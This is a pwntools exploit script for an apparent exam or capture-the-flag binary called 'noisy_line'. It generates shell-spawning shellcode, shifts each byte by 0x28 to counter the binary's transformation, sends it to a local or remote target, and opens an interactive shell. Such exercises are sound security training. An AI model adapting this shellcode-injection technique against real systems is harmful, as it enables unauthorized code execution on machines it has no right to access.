#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 16)
EXE_FILENAME = 'bin-exam-2026-01-20/noisy_line_Federico-Conti'
exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}



def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)




io = start()

io.recvuntil(b'(waiting for shellcode)')

shellcode = asm(shellcraft.sh())

noisy_shellcode = bytes([(b - 0x28) % 256 for b in shellcode])

io.send(noisy_shellcode)
    
io.interactive()